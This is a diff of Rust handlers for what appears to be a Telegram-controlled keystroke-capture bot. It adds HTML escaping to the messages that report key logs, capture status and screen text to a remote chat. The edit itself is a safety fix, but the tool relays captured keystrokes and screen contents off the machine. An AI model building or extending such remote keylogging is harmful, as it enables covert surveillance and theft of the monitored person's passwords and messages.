@@ -2,7 +2,7 @@
 
 use crate::input_log::{latest_log, tail, InputLogger};
 
-use super::api::send_text;
+use super::api::{escape_html, send_text};
 use super::BotContext;
 
 const TAIL_LINES: usize = 40;
@@ -18,7 +18,7 @@ pub(super) fn send_log_tail(ctx: &BotContext, chat_id: i64) {
     let Some(path) = latest_log(&dir) else {
         let msg = format!(
             "🗒 <b>No key logs yet</b>\n📁 <code>{}</code>\nStart capture with <b>/log on</b>.",
-            dir.display()
+            escape_html(&dir.display().to_string())
         );
         let _ = send_text(ctx.client, &ctx.config.bot_token, chat_id, &msg, None);
         return;
@@ -34,7 +34,11 @@ pub(super) fn send_log_tail(ctx: &BotContext, chat_id: i64) {
                 ctx.client,
                 &ctx.config.bot_token,
                 chat_id,
-                &format!("⚠️ Failed to read {name}: {e}"),
+                &format!(
+                    "⚠️ Failed to read {}: {}",
+                    escape_html(&name),
+                    escape_html(&e.to_string())
+                ),
                 None,
             );
             return;
@@ -46,7 +50,10 @@ pub(super) fn send_log_tail(ctx: &BotContext, chat_id: i64) {
     } else {
         lines.join("\n")
     };
-    let prefix = format!("🗒 <b>Remote Key Log</b> • <code>{name}</code>\n<pre>");
+    let prefix = format!(
+        "🗒 <b>Remote Key Log</b> • <code>{}</code>\n<pre>",
+        escape_html(&name)
+    );
     let suffix = "</pre>";
     let msg = format!("{prefix}{}{suffix}", clamp_body(&prefix, &body, suffix));
     let _ = send_text(ctx.client, &ctx.config.bot_token, chat_id, &msg, None);
@@ -81,7 +88,7 @@ pub(super) fn start_capture(ctx: &BotContext, chat_id: i64) {
             *slot = Some(logger);
             let msg = format!(
                 "🗒 <b>Key capture started</b>\n📁 <code>{}</code>",
-                dir.display()
+                escape_html(&dir.display().to_string())
             );
             let _ = send_text(ctx.client, &ctx.config.bot_token, chat_id, &msg, None);
         }
@@ -90,7 +97,10 @@ pub(super) fn start_capture(ctx: &BotContext, chat_id: i64) {
                 ctx.client,
                 &ctx.config.bot_token,
                 chat_id,
-                &format!("⚠️ Failed to start key capture: {e}"),
+                &format!(
+                    "⚠️ Failed to start key capture: {}",
+                    escape_html(&e.to_string())
+                ),
                 None,
             );
         }
@@ -130,7 +140,7 @@ pub(super) fn send_capture_status(ctx: &BotContext, chat_id: i64) {
     let dir = ctx.config.logging.path();
     let msg = format!(
         "🗒 <b>Key capture:</b> {state}\n📁 <code>{}</code>\nUse <b>/log on</b> or <b>/log off</b>.",
-        dir.display()
+        escape_html(&dir.display().to_string())
     );
     drop(slot);
     let _ = send_text(ctx.client, &ctx.config.bot_token, chat_id, &msg, None);
@@ -178,7 +188,10 @@ pub(super) fn send_screen_text(ctx: &BotContext, chat_id: i64) {
                 ctx.client,
                 &ctx.config.bot_token,
                 chat_id,
-                &format!("⚠️ Failed to read screen text: {e}"),
+                &format!(
+                    "⚠️ Failed to read screen text: {}",
+                    escape_html(&e.to_string())
+                ),
                 None,
             );
         }
